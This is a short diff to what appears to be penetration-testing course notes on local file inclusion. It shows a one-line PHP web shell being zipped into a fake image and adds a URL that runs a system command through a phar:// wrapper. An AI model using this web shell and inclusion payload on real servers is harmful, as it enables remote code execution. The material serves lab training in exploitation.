@@ -35,6 +35,9 @@ echo '<?php system($_GET["cmd"]); ?>' | base64
 ```
 [/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
 ```
+```
+(http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%23shell.php&cmd=id)
+```
 ### Phar Upload
 Finally, we can use the phar:// wrapper to achieve a similar result. To do so, we will first write the following PHP script into a shell.php file:
 ```
